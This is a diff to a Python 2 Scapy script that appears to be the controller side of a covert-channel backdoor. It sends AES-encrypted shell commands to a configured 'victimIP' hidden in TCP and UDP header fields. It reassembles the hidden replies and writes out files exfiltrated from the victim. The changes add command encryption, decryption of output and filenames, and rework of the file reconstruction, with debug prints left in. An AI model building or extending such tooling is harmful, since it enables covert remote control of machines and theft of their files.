@@ -5,6 +5,7 @@ from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
 import uuid #Used to generate UID's
 import os # Used for executing commands on shell.
 import parseConfig
+import time
 
 #Inputs from config file
 victimIP = parseConfig.victimIP
@@ -337,9 +338,12 @@ def handle(packet):
                     addToMessages(messages, UID, total, covertContent)
                     # After every add, check if the max has been reached
                     if(checkCommands(UID)):
+
                         #DEBUG: print "Max reached, reconstruct command"
+
                         command = reconstructCommand(UID)
-                        print "OUTPUT: \n " + command
+                        decryptedMessage = decrypt(command)
+                        print "OUTPUT: \n " + decryptedMessage
 
                         #Run the command
                     # else:
@@ -389,7 +393,13 @@ def receiveFile(packet):
                     addToMessages(messages, UID, total, covertContent)
                     # After every add, check if the max has been reached
                     if(checkCommands(UID)):
-                        newFile = writeFile(UID)
+                        # print "Position " + str(position)
+                        # print "Total " + str(total)
+                        # print 'ALL MESSAGES IN SEQUENCE RECEIVED!!!! \n\n\n\n'
+                        # print "Starting sleep"
+                        # time.sleep(2)
+                        # print "Ending sleep"
+                        writeFile(UID)
 
 def lengthChecker(type,field):
     covertContent = 0
@@ -403,11 +413,15 @@ def lengthChecker(type,field):
             covertContent = bin(field)[2:].zfill(24)
         elif len(seqContent) > 24 and len(seqContent) < 32:
             covertContent = bin(field)[2:].zfill(32)
+        else:
+            return seqContent
     elif(type == "UDP"):
         if len(seqContent) < 8:
             covertContent = bin(field)[2:].zfill(8)
         elif len(seqContent) > 8 and len(seqContent) < 16:
             covertContent = bin(field)[2:].zfill(16)
+        else:
+            return seqContent
     return covertContent
 
 def writeFile(UID):
@@ -417,7 +431,6 @@ def writeFile(UID):
         fileName = ""
         if(element[0] == UID):
             data = element[2]
-
             for value in data:
                 text += str(value)
                 pass
@@ -425,37 +438,34 @@ def writeFile(UID):
             line = text
             n = 8
             chunks = [line[i:i+n] for i in range(0, len(line), n)]
-            fileBinary = [line[i:i+n] for i in range(0, len(line), n)]
+            # print chunks
             #Convert each element in array to integer
             for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
                 chunks[x] = chr(chunks[x])
+            # print str(chunks)
 
-            #Combine all the strings/messages
-            getFileName = ''.join(chunks)
-            start = getFileName.index('\n')
-            startBinary = (start*8)
-            #Split by \n
-            getFileName = getFileName.split("\n")
-            #Get the file name from the message
-            fileName = getFileName[:1]
-            #Change the lists into strings
-            fileName = ''.join(fileName)
-            fileBinary = ''.join(fileBinary)
-            #Grab just the data inside the files
-            data = fileBinary[startBinary:len(fileBinary)]
+            binaryString = ''.join(chunks)
+            print "binaryString " + binaryString + "\n"
+            #print "Binary string is  " + binaryString
 
-            newByteArray = []
-            #grab chunks of 8 bits and store it into newByteArray
-            for i in range (0, len(data)/8):
-                newByteArray.append(int(data[i*8:(i+1) * 8], 2))
-            #change everything in newByteArray into decimal values and store into byteArray
-            byteArray = array.array('B', newByteArray).tostring()
+            delimiter = binaryString.index('\n')
 
-            secretMessage = bytearray(byteArray)
-        	#re-create the file
-            createFile = open(saveDir + fileName, 'wb')
-            createFile.write(secretMessage)
+            #Everything until the delimiter is the file name
+            fileName = decrypt(binaryString[0:delimiter])
+            decryptedFileName = fileName
+            print "File name is " + decryptedFileName
+
+            fileContents = ''.join(chunks[delimiter+1:])
+            print fileContents
+
+            createFile = open(saveDir + decryptedFileName, 'w')
+            createFile.write(fileContents)
+            createFile.close()
+
+            print "Wrote file " + decryptedFileName
+
+
 
 def sniffCommand():
     while True:
@@ -469,7 +479,9 @@ def sniffCommand():
             sys.exit()
         else:
             #TODO: Change this to  ("TCP",command,"command")
-            sendmessage("TCP",command,"command")
+            encryptedCommand = encrypt(command)
+            #print "encrypted command is " + encryptedCommand
+            sendmessage("TCP",encryptedCommand,"command")
             sniff(timeout=10, filter="ip", prn=handle)
 
 def sniffFile():
